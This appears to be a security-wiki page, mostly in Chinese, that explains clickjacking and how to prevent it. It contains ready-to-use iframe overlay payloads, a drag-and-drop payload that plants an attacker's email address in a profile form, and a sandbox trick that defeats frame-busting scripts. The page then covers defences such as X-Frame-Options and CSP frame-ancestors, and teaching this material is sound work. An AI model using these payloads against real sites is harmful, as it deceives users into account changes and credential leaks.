# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## What is Clickjacking

在一次 clickjacking 攻击中，**用户**会被**诱骗**去**点击**网页上一个**元素**，该元素要么**不可见**，要么被伪装成另一个元素。 这种操控可能导致用户遭受意外后果，例如下载 malware、被重定向到恶意网页、提供 credentials 或其它敏感信息、转账，或在线购买商品。

### Prepopulate forms trick

有时可以**在加载页面时使用 GET parameters 填充表单字段的值**。攻击者可能滥用此行为，用任意数据填充表单并发送 clickjacking payload，从而诱使用户按下 Submit 按钮。

### Populate form with Drag\&Drop

如果你需要用户**填写表单**，但又不想直接要求他输入某些特定信息（例如你已知的 email 或特定密码），你可以让他**Drag\&Drop** 某些会写入你控制数据的东西，像 [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)。

### 基本 Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### 多步骤 payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

如果你发现一个 **需要用户点击的 XSS 攻击**（即需要用户点击某个元素来**触发** XSS），并且该页面**易受 Clickjacking 攻击**，你可以利用它诱骗用户点击按钮/链接。\
示例：\
你在账户的一些私密信息中发现了 **self XSS**（这些信息是**只有你可以设置和读取**的）。用于设置这些信息的页面上的 **form** 易受 **Clickjacking** 攻击，并且你可以通过 GET parameters **预填充**该 **form**。\
攻击者可以针对该页面准备一个 **Clickjacking** 攻击，**预填充**该 **form** 以放入 **XSS payload**，并**诱导**该 **user** 去 **Submit** 该表单。 所以，**当 form 被提交** 且值被修改时，**user 将触发 XSS**。


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> 该技术可以诱骗用户在受害页面的同一位置点击，绕过对 Clickjacking 的所有防护。因此攻击者需要找到那些**只需一次点击就能完成的敏感操作，例如接受权限的 OAuth 提示**。

### Browser extensions: DOM-based autofill clickjacking

除了对受害页面进行 iframing 外，攻击者还可以针对注入到页面中的 browser extension UI 元素。Password managers 会在聚焦的 inputs 附近渲染 autofill 下拉；通过聚焦一个攻击者控制的字段并隐藏/遮挡扩展的下拉（opacity/overlay/top-layer 技巧），被迫的用户点击可以选择已存储的条目并将敏感数据填入攻击者控制的 inputs 中。此变体不需要 iframe 暴露，完全通过 DOM/CSS 操作即可实现。

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

在客户端执行的脚本可以执行一些操作以防止 Clickjacking：

- 确保应用窗口是主窗口或顶层窗口。
- 使所有 frames 可见。
- 阻止对不可见 frames 的点击。
- 检测并提醒用户可能的 Clickjacking 尝试。

然而，这些 frame-busting 脚本可能被规避：

- **Browsers' Security Settings:** 某些浏览器可能基于其安全设置或缺乏 JavaScript 支持而阻止这些脚本。
- **HTML5 iframe sandbox Attribute:** 攻击者可以通过将 sandbox 属性设置为包含 allow-forms 或 allow-scripts 但不包含 allow-top-navigation 来使 frame buster 脚本失效。这会阻止 iframe 验证它是否为顶层窗口，例如，
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
allow-forms 和 allow-scripts 值在 iframe 内启用操作，同时禁用顶级导航。为确保目标站点的预期功能，根据攻击类型可能需要额外权限，例如 allow-same-origin 和 allow-modals。浏览器控制台消息可以指示应允许哪些权限。

### Server-Side Defenses

#### X-Frame-Options

The **X-Frame-Options HTTP 响应头** 通知浏览器在 <frame> 或 <iframe> 中渲染页面是否合法，帮助防止 Clickjacking：

- X-Frame-Options: deny - 没有域可以嵌入该内容。
- X-Frame-Options: sameorigin - 只有同源站点可以嵌入该内容。
- X-Frame-Options: allow-from https://trusted.com - 只有指定的 'uri' 可以嵌入该页面。
- 注意其限制：如果浏览器不支持此指令，则可能无效。某些浏览器更倾向于使用 CSP 的 frame-ancestors 指令。

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** 是建议用于防护 Clickjacking 的方法：

- frame-ancestors 'none' - 类似于 X-Frame-Options: deny。
- frame-ancestors 'self' - 类似于 X-Frame-Options: sameorigin。
- frame-ancestors trusted.com - 类似于 X-Frame-Options: allow-from。

例如，下面的 CSP 仅允许来自相同域的嵌入：

Content-Security-Policy: frame-ancestors 'self';

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with child-src and frame-src

**Content Security Policy (CSP)** 是一种安全措施，通过指定浏览器应允许从哪些来源加载内容，来帮助防止 Clickjacking 和其他代码注入攻击。

#### frame-src Directive

- 定义 frames 的有效来源。
- 比 default-src 指令更具体。
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
此策略允许来自同一来源（self）和 https://trusted-website.com 的 frames。

#### child-src 指令

- 在 CSP level 2 中引入，用于为 web workers 和 frames 设置有效来源。
- 作为 frame-src 和 worker-src 的回退。
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
此策略允许来自相同来源（self）和 https://trusted-website.com 的 frames 和 workers。

**使用说明：**

- 弃用：child-src 正逐步被 frame-src 和 worker-src 取代。
- 回退行为：如果缺少 frame-src，则使用 child-src 作为 frames 的回退。如果两者都缺失，则使用 default-src。
- 严格源定义：在指令中仅包含受信任的源以防止被利用。

#### JavaScript Frame-Breaking Scripts

尽管不能完全万无一失，JavaScript-based frame-busting scripts 可用于防止网页被嵌入。示例：
```javascript
if (top !== self) {
top.location = self.location
}
```
#### 使用 Anti-CSRF Tokens

- **Token Validation:** 在 Web 应用中使用 anti-CSRF tokens，以确保会更改状态的请求是由用户有意发起的，而不是通过被 Clickjacked 的页面发起的。

## 参考

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
